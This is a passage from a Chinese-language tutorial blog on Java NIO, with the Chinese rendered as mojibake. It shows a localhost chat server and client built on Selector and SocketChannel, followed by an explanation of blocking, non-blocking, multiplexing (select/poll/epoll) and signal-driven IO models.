class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Chat2Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ª ServerSocketChannel</span></span><br><span class="line">        <span class="type">ServerSocketChannel</span> <span class="variable">serverSocketChannel</span> <span class="operator">=</span> ServerSocketChannel.open();</span><br><span class="line">        serverSocketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">        serverSocketChannel.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8080</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªselector</span></span><br><span class="line">        <span class="type">Selector</span> <span class="variable">selector</span> <span class="operator">=</span> Selector.open();</span><br><span class="line">        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line">        System.out.println(<span class="string">&quot;èŠå¤©å®¤æœåŠ¡ç«¯å¯åŠ¨äº†&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®¢æˆ·ç«¯è¿æ¥</span></span><br><span class="line">        AtomicReference&lt;SocketChannel&gt; clientRef = <span class="keyword">new</span> <span class="title class_">AtomicReference</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»æ§åˆ¶å°è¯»å–è¾“å…¥å¹¶å‘é€ç»™å®¢æˆ·ç«¯</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">sendMessageThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">           <span class="keyword">try</span>(<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in)))&#123;</span><br><span class="line">               <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">                   System.out.println(<span class="string">&quot;è¾“å…¥æœåŠ¡å™¨æ¶ˆæ¯&quot;</span>);</span><br><span class="line">                   <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> reader.readLine();</span><br><span class="line">                   <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> clientRef.get();</span><br><span class="line">                   <span class="keyword">if</span>(client != <span class="literal">null</span> &amp;&amp; client.isConnected())&#123;</span><br><span class="line">                       <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.wrap((message + <span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">                       client.write(buffer);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        sendMessageThread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">readyChannels</span> <span class="operator">=</span> selector.select();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(readyChannels == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class="line">            Iterator&lt;SelectionKey&gt; keyIterator = selectionKeys.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(keyIterator.hasNext())&#123;</span><br><span class="line">                <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> keyIterator.next();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(key.isAcceptable())&#123;</span><br><span class="line">                    <span class="comment">// æ¥å—å®¢æˆ·ç«¯è¿æ¥</span></span><br><span class="line">                    <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> serverSocketChannel.accept();</span><br><span class="line">                    System.out.println(<span class="string">&quot;å®¢æˆ·ç«¯è¿æ¥&quot;</span>);</span><br><span class="line">                    client.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                    client.register(selector, SelectionKey.OP_READ);</span><br><span class="line">                    clientRef.set(client);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(key.isReadable())&#123;</span><br><span class="line">                    <span class="comment">// è¯»å–å®¢æˆ·ç«¯æ¶ˆæ¯</span></span><br><span class="line">                    <span class="type">SocketChannel</span> <span class="variable">channel</span> <span class="operator">=</span> (SocketChannel) key.channel();</span><br><span class="line">                    <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> channel.read(buffer);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span>(bytesRead &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        buffer.flip();</span><br><span class="line">                        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[buffer.remaining()];</span><br><span class="line">                        buffer.get(bytes);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytes).trim();</span><br><span class="line">                        System.out.println(<span class="string">&quot;å®¢æˆ·ç«¯æ¶ˆæ¯&quot;</span> + message);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                keyIterator.remove();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Chat2Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªsocketChannel</span></span><br><span class="line">        <span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> SocketChannel.open();</span><br><span class="line">        socketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">        socketChannel.connect(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">8080</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªselector</span></span><br><span class="line">        <span class="type">Selector</span> <span class="variable">selector</span> <span class="operator">=</span> Selector.open();</span><br><span class="line">        socketChannel.register(selector, SelectionKey.OP_CONNECT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å“¦å—¯æ§åˆ¶å°è¯»å–è¾“å…¥å¹¶å‘é€ç»™æœåŠ¡å™¨ç«¯</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">senMessageThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in)))&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;è¾“å…¥å®¢æˆ·ç«¯æ¶ˆæ¯&quot;</span>);;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> reader.readLine();</span><br><span class="line">                    <span class="keyword">if</span>(socketChannel.isConnected())&#123;</span><br><span class="line">                        <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.wrap((message + <span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">                        socketChannel.write(buffer);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        senMessageThread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">readyChannels</span> <span class="operator">=</span> selector.select();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(readyChannels == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class="line">            Iterator&lt;SelectionKey&gt; keyIterator = selectionKeys.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(keyIterator.hasNext())&#123;</span><br><span class="line">                <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> keyIterator.next();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(key.isConnectable())&#123;</span><br><span class="line">                    <span class="comment">// è¿æ¥åˆ°æœåŠ¡å™¨</span></span><br><span class="line">                    socketChannel.finishConnect();</span><br><span class="line">                    socketChannel.register(selector, SelectionKey.OP_READ);</span><br><span class="line">                    System.out.println(<span class="string">&quot;å·²è¿æ¥åˆ°æœåŠ¡å™¨&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(key.isReadable())&#123;</span><br><span class="line">                    <span class="comment">// è¯»å–æœåŠ¡å™¨æ¶ˆæ¯</span></span><br><span class="line">                    <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> socketChannel.read(buffer);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(bytesRead &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        buffer.flip();</span><br><span class="line">                        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[buffer.remaining()];</span><br><span class="line">                        buffer.get(bytes);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytes).trim();</span><br><span class="line">                        System.out.println(<span class="string">&quot;æœåŠ¡å™¨æ¶ˆæ¯&quot;</span> + message);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                keyIterator.remove();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‰é¢æˆ‘ä»¬äº†è§£åˆ°ï¼ŒJava NIO åœ¨æ–‡ä»¶ IO ä¸Šçš„æ€§èƒ½å…¶å®å’Œä¼ ç»Ÿ IO å·®ä¸å¤šï¼Œç”šè‡³åœ¨å¤„ç†å¤§æ–‡ä»¶çš„æ—¶å€™è¿˜æœ‰äº›ç”˜æ‹œä¸‹é£ï¼Œä½† NIO çš„ä¸»è¦ä½œç”¨ä½“ç°åœ¨ç½‘ç»œ IO ä¸Šï¼Œåƒ Netty æ¡†æ¶åº•å±‚å…¶å®å°±æ˜¯ NIOï¼Œæˆ‘ä»¬æ¥åšä¸€ä¸‹ç®€å•çš„æ€»ç»“å§ã€‚<br>SocketChannelï¼ˆç”¨äº TCP è¿æ¥ï¼‰å’Œ ServerSocketChannelï¼ˆç”¨äºç›‘å¬å’Œæ¥å—æ–°çš„ TCP è¿æ¥ï¼‰å¯ä»¥ç”¨æ¥æ›¿ä»£ä¼ ç»Ÿçš„ Socket å’Œ ServerSocket ç±»ï¼Œæä¾›éé˜»å¡æ¨¡å¼ã€‚<br>NIO æ”¯æŒé˜»å¡å’Œéé˜»å¡æ¨¡å¼ã€‚éé˜»å¡æ¨¡å¼å…è®¸ç¨‹åºåœ¨ç­‰å¾… I&#x2F;O æ—¶æ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œä»è€Œæé«˜å¹¶å‘æ€§èƒ½ã€‚éé˜»å¡æ¨¡å¼çš„å®ç°ä¾èµ–äº Selectorï¼Œå®ƒå¯ä»¥ç›‘æ§å¤šä¸ªé€šé“ä¸Šçš„ I&#x2F;O äº‹ä»¶ã€‚<br>NIO æ”¯æŒå°†æ•°æ®åˆ†æ•£åˆ°å¤šä¸ª Bufferï¼ˆScatterï¼‰æˆ–ä»å¤šä¸ª Buffer æ”¶é›†æ•°æ®ï¼ˆGatherï¼‰ï¼Œæä¾›äº†æ›´é«˜æ•ˆçš„æ•°æ®ä¼ è¾“æ–¹å¼ã€‚<br>Java NIO.2 å¼•å…¥äº† AsynchronousSocketChannel å’Œ AsynchronousServerSocketChannelï¼Œè¿™äº›ç±»æä¾›äº†åŸºäºå›è°ƒçš„å¼‚æ­¥ I&#x2F;O æ“ä½œã€‚å¼‚æ­¥å¥—æ¥å­—é€šé“å¯ä»¥åœ¨å®Œæˆ I&#x2F;O æ“ä½œæ—¶è‡ªåŠ¨è§¦å‘å›è°ƒå‡½æ•°ï¼Œä»è€Œå®ç°é«˜æ•ˆçš„å¼‚æ­¥å¤„ç†ã€‚</p><h2 id="Java-IOæ¨¡å‹"><a href="#Java-IOæ¨¡å‹" class="headerlink" title="Java IOæ¨¡å‹"></a>Java IOæ¨¡å‹</h2><p>é˜»å¡ I&#x2F;Oï¼ˆBlocking I&#x2F;Oï¼‰ï¼šåœ¨è¿™ç§æ¨¡å‹ä¸­ï¼ŒI&#x2F;O æ“ä½œæ˜¯é˜»å¡çš„ï¼Œå³æ‰§è¡Œ I&#x2F;O æ“ä½œæ—¶ï¼Œçº¿ç¨‹ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°æ“ä½œå®Œæˆã€‚åœ¨é˜»å¡ I&#x2F;O æ¨¡å‹ä¸­ï¼Œæ¯ä¸ªè¿æ¥éƒ½éœ€è¦ä¸€ä¸ªçº¿ç¨‹æ¥å¤„ç†ã€‚å› æ­¤ï¼Œå¯¹äºå¤§é‡å¹¶å‘è¿æ¥çš„åœºæ™¯ï¼Œé˜»å¡ I&#x2F;O æ¨¡å‹çš„æ€§èƒ½è¾ƒå·®ã€‚<br><img src="/2024/11/04/code/javanio/image-8.png"><br>éé˜»å¡ I&#x2F;Oï¼ˆNon-blocking I&#x2F;Oï¼‰ï¼šåœ¨è¿™ç§æ¨¡å‹ä¸­ï¼ŒI&#x2F;O æ“ä½œä¸ä¼šé˜»å¡çº¿ç¨‹ã€‚å½“æ•°æ®å°šæœªå‡†å¤‡å¥½æ—¶ï¼ŒI&#x2F;O è°ƒç”¨ä¼šç«‹å³è¿”å›ã€‚çº¿ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œç„¶ååœ¨é€‚å½“çš„æ—¶å€™å†æ¬¡å°è¯•æ‰§è¡Œ I&#x2F;O æ“ä½œã€‚éé˜»å¡ I&#x2F;O æ¨¡å‹å…è®¸å•ä¸ªçº¿ç¨‹åŒæ—¶å¤„ç†å¤šä¸ªè¿æ¥ï¼Œä½†å¯èƒ½éœ€è¦åœ¨åº”ç”¨ç¨‹åºçº§åˆ«è¿›è¡Œå¤æ‚çš„è°ƒåº¦å’Œç®¡ç†ã€‚<br><img src="/2024/11/04/code/javanio/image-9.png"></p><p>åœ¨ä¸Šé¢çš„ä¸¤å¹…å›¾ä¸­ï¼Œæ¶‰åŠåˆ°äº†ä¸¤ä¸ªæ¦‚å¿µï¼šå†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´ã€‚æˆ‘ä»¬ä¹‹å‰åœ¨ä»‹ç»éç›´æ¥ç¼“å†²åŒºçš„æ—¶å€™ï¼Œæœ‰è¿™æ ·ä¸€å‰¯å›¾ç‰‡ã€‚<br><img src="/2024/11/04/code/javanio/image-10.png"></p><p>é™¤äº†å‰é¢æåˆ°çš„é˜»å¡ IO å’Œéé˜»å¡ IO æ¨¡å‹ï¼Œè¿˜æœ‰å¦å¤–ä¸‰ç§ IO æ¨¡å‹ï¼Œåˆ†åˆ«æ˜¯å¤šè·¯å¤ç”¨ã€ä¿¡å·é©±åŠ¨å’Œå¼‚æ­¥ IOã€‚</p><h3 id="å¤šè·¯å¤ç”¨"><a href="#å¤šè·¯å¤ç”¨" class="headerlink" title="å¤šè·¯å¤ç”¨"></a>å¤šè·¯å¤ç”¨</h3><p>I&#x2F;O å¤šè·¯å¤ç”¨ï¼ˆI&#x2F;O Multiplexingï¼‰æ¨¡å‹ä½¿ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„å¤šè·¯å¤ç”¨åŠŸèƒ½ï¼ˆå¦‚ selectã€pollã€epoll ç­‰ï¼‰ï¼Œä½¿å¾—å•ä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶å¤„ç†å¤šä¸ª I&#x2F;O äº‹ä»¶ã€‚å½“æŸä¸ªè¿æ¥ä¸Šçš„æ•°æ®å‡†å¤‡å¥½æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šé€šçŸ¥åº”ç”¨ç¨‹åºã€‚è¿™æ ·ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­å¤„ç†å¤šä¸ªå¹¶å‘è¿æ¥ï¼Œè€Œä¸éœ€è¦ä¸ºæ¯ä¸ªè¿æ¥åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ã€‚</p><ul><li>select æ˜¯ Unix ç³»ç»Ÿä¸­æœ€æ—©çš„ I&#x2F;O å¤šè·¯å¤ç”¨æŠ€æœ¯ã€‚å®ƒå…è®¸ä¸€ä¸ªçº¿ç¨‹åŒæ—¶ç›‘è§†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆå¦‚å¥—æ¥å­—ï¼‰ï¼Œå¹¶ç­‰å¾…æŸä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸Šçš„ I&#x2F;O äº‹ä»¶ï¼ˆå¦‚å¯è¯»ã€å¯å†™æˆ–å¼‚å¸¸ï¼‰ã€‚select çš„ä¸»è¦é—®é¢˜æ˜¯æ€§èƒ½å—é™ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤§é‡æ–‡ä»¶æè¿°ç¬¦æ—¶ã€‚è¿™æ˜¯å› ä¸ºå®ƒä½¿ç”¨ä¸€ä¸ªä½æ©ç æ¥è¡¨ç¤ºæ–‡ä»¶æè¿°ç¬¦é›†ï¼Œæ¯æ¬¡è°ƒç”¨éƒ½éœ€è¦ä¼ é€’è¿™ä¸ªæ©ç ï¼Œå¹¶åœ¨å†…æ ¸å’Œç”¨æˆ·ç©ºé—´ä¹‹é—´è¿›è¡Œå¤åˆ¶ã€‚</li><li>poll æ˜¯å¯¹ select çš„æ”¹è¿›ã€‚å®ƒä½¿ç”¨ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦æ•°ç»„è€Œä¸æ˜¯ä½æ©ç æ¥è¡¨ç¤ºæ–‡ä»¶æè¿°ç¬¦é›†ã€‚è¿™æ ·å¯ä»¥é¿å… select ä¸­çš„æ€§èƒ½é—®é¢˜ã€‚ç„¶è€Œï¼Œpoll ä»ç„¶éœ€è¦éå†æ•´ä¸ªæ–‡ä»¶æè¿°ç¬¦æ•°ç»„ï¼Œä»¥æ£€æŸ¥æ¯ä¸ªæ–‡ä»¶æè¿°ç¬¦çš„çŠ¶æ€ã€‚å› æ­¤ï¼Œåœ¨å¤„ç†å¤§é‡æ–‡ä»¶æè¿°ç¬¦æ—¶ï¼Œæ€§èƒ½ä»ç„¶å—é™ã€‚</li><li>epoll æ˜¯ Linux ä¸­çš„ä¸€ç§é«˜æ€§èƒ½ I&#x2F;O å¤šè·¯å¤ç”¨æŠ€æœ¯ã€‚å®ƒé€šè¿‡åœ¨å†…æ ¸ä¸­ç»´æŠ¤ä¸€ä¸ªäº‹ä»¶è¡¨æ¥é¿å…éå†æ–‡ä»¶æè¿°ç¬¦æ•°ç»„çš„æ€§èƒ½é—®é¢˜ã€‚å½“æŸä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸Šçš„ I&#x2F;O äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå†…æ ¸ä¼šå°†è¯¥äº‹ä»¶æ·»åŠ åˆ°äº‹ä»¶è¡¨ä¸­ã€‚åº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨ epoll_wait å‡½æ•°æ¥è·å–å·²å‡†å¤‡å¥½çš„ I&#x2F;O äº‹ä»¶ï¼Œè€Œæ— éœ€éå†æ•´ä¸ªæ–‡ä»¶æè¿°ç¬¦é›†ã€‚è¿™ç§æ–¹æ³•å¤§å¤§æé«˜äº†åœ¨å¤§é‡å¹¶å‘è¿æ¥ä¸‹çš„æ€§èƒ½ã€‚<br><img src="/2024/11/04/code/javanio/image-11.png"></li></ul><p>åœ¨ Java NIO ä¸­ï¼ŒI&#x2F;O å¤šè·¯å¤ç”¨ä¸»è¦é€šè¿‡ Selector ç±»å®ç°ã€‚Selector èƒ½å¤Ÿç›‘æ§å¤šä¸ª Channelï¼ˆé€šé“ï¼‰ä¸Šçš„ I&#x2F;O äº‹ä»¶ï¼Œå¦‚è¿æ¥ã€è¯»å–å’Œå†™å…¥ã€‚è¿™ä½¿å¾—ä¸€ä¸ªçº¿ç¨‹å¯ä»¥å¤„ç†å¤šä¸ªå¹¶å‘è¿æ¥ï¼Œæé«˜äº†ç¨‹åºçš„æ€§èƒ½å’Œå¯ä¼¸ç¼©æ€§ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">readyChannels</span> <span class="operator">=</span> selector.select();</span><br><span class="line">    <span class="keyword">if</span> (readyChannels == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    Set&lt;SelectionKey&gt; selectedKeys = selector.selectedKeys();</span><br><span class="line">    Iterator&lt;SelectionKey&gt; keyIterator = selectedKeys.iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (keyIterator.hasNext()) &#123;</span><br><span class="line">        <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> keyIterator.next();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (key.isAcceptable()) &#123;</span><br><span class="line">            <span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> serverSocketChannel.accept();</span><br><span class="line">            socketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">            socketChannel.register(selector, SelectionKey.OP_READ);</span><br><span class="line">            System.out.println(<span class="string">&quot;å®¢æˆ·ç«¯è¿æ¥ä¸Šäº†: &quot;</span> + socketChannel.getRemoteAddress());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.isReadable()) &#123;</span><br><span class="line">            <span class="comment">// å¤„ç†è¯»å–æ•°æ®äº‹ä»¶</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.isWritable()) &#123;</span><br><span class="line">            <span class="comment">// å¤„ç†å†™å…¥æ•°æ®äº‹ä»¶</span></span><br><span class="line">        &#125;</span><br><span class="line">        keyIterator.remove();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Selector çš„ select() æ–¹æ³•ç­‰å¾… I&#x2F;O äº‹ä»¶ã€‚select() æ–¹æ³•ä¼šé˜»å¡ï¼Œç›´åˆ°è‡³å°‘æœ‰ä¸€ä¸ª Channel ä¸Šçš„äº‹ä»¶å‘ç”Ÿã€‚å½“æœ‰äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨ selectedKeys() æ–¹æ³•è·å–å·²å‡†å¤‡å¥½è¿›è¡Œ I&#x2F;O æ“ä½œçš„ Channel çš„ SelectionKey é›†åˆã€‚</p><h3 id="ä¿¡å·é©±åŠ¨"><a href="#ä¿¡å·é©±åŠ¨" class="headerlink" title="ä¿¡å·é©±åŠ¨"></a>ä¿¡å·é©±åŠ¨</h3><p>ä¿¡å·é©±åŠ¨ I&#x2F;Oï¼ˆSignal-driven I&#x2F;Oï¼‰æ¨¡å‹ä¸­ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥å‘æ“ä½œç³»ç»Ÿæ³¨å†Œä¸€ä¸ªä¿¡å·å¤„ç†å‡½æ•°ï¼Œå½“æŸä¸ª I&#x2F;O äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šå‘é€ä¸€ä¸ªä¿¡å·é€šçŸ¥åº”ç”¨ç¨‹åºã€‚åº”ç”¨ç¨‹åºåœ¨æ”¶åˆ°ä¿¡å·åå¤„ç†ç›¸åº”çš„ I&#x2F;O äº‹ä»¶ã€‚è¿™ç§æ¨¡å‹ä¸éé˜»å¡ I&#x2F;O ç±»ä¼¼ï¼Œä¹Ÿéœ€è¦åœ¨åº”ç”¨ç¨‹åºçº§åˆ«è¿›è¡Œäº‹ä»¶ç®¡ç†å’Œè°ƒåº¦ã€‚<br><img src="/2024/11/04/code/javanio/image-12.png"></p><p>å¤šè·¯å¤ç”¨å’Œä¿¡å·é©±åŠ¨çš„å·®åˆ«ä¸»è¦åœ¨äº‹ä»¶é€šçŸ¥æœºåˆ¶å’Œå¼•ç”¨åœºæ™¯ä¸Šã€‚</p><p>å¤šè·¯å¤ç”¨æ¨¡å‹å…è®¸ä¸€ä¸ªçº¿ç¨‹åŒæ—¶ç®¡ç†å¤šä¸ª I&#x2F;O è¿æ¥ã€‚è¿™æ˜¯é€šè¿‡ä½¿ç”¨ç‰¹æ®Šçš„ç³»ç»Ÿè°ƒç”¨ï¼ˆå¦‚ selectã€poll å’Œ epollï¼‰å®ç°çš„ï¼Œå®ƒä»¬èƒ½å¤Ÿç›‘è§†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦ä¸Šçš„ 